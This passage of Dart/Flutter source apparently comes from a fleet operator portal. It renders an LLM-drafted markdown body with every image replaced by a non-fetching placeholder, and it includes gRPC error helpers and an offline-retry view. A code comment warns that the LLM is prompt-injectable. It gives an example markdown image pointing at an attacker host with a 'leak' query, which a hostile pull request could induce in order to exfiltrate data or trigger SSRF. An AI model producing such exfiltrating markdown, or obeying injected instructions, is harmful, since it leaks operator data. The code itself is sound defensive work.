    // — the LLM is prompt-injectable). Never auto-fetch an embedded image: a
    // hostile PR could induce `![x](http://attacker/track.png?leak=…)` in the
    // draft, and rendering it would fire a request from the operator's browser
    // (a tracking pixel / SSRF). Replace every image with an inert placeholder;
    // no network request is ever made, whatever the scheme. Links are already
    // inert (we pass no `onTapLink`, so a tap does nothing).
    return Markdown(
      data: body,
      selectable: true,
      sizedImageBuilder: _inertImage,
    );
  }

  /// A non-fetching stand-in for a markdown image — shows the alt text (or the
  /// raw URI) without loading anything. See the security note at the call site.
  Widget _inertImage(MarkdownImageConfig config) {
    final label = (config.alt != null && config.alt!.isNotEmpty)
        ? config.alt!
        : config.uri.toString();
    return Tooltip(
      message: config.uri.toString(),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          const Icon(Icons.image_not_supported_outlined, size: 16),
          const SizedBox(width: 4),
          Flexible(
            child: Text('[image not loaded: $label]',
                style: const TextStyle(fontStyle: FontStyle.italic)),
          ),
        ],
      ),
    );
  }
}

/// gRPC `NotFound` status code. `package:grpc/service_api.dart` (all the portal
/// imports) doesn't export `StatusCode`, so we compare the numeric code.
const int _grpcNotFound = 5;

/// The gRPC status code carried by an error, or null if it isn't a `GrpcError`.
/// `GrpcError` isn't exported by `service_api.dart` either, so read `.code`
/// dynamically rather than catching the type.
int? _grpcCode(Object e) {
  try {
    final code = (e as dynamic).code;
    return code is int ? code : null;
  } catch (_) {
    return null;
  }
}

/// Whole-view offline state with a retry, mirroring the other pages' pattern.
class _OfflineRetry extends StatelessWidget {
  final String message;
  final VoidCallback onRetry;
  const _OfflineRetry(
      {super.key, required this.message, required this.onRetry});

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          const Icon(Icons.cloud_off, size: 48),
          const SizedBox(height: 12),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 32),
            child: Text('Not connected to the fleet (:50086).\n$message',
                textAlign: TextAlign.center),
          ),
          const SizedBox(height: 12),
          FilledButton(onPressed: onRetry, child: const Text('Retry')),
        ],
      ),
    );
  }
}

extension _FirstOrNull<E> on Iterable<E> {
  E? get firstOrNull {
    final it = iterator;
    return it.moveNext() ? it.current : null;
  }
}
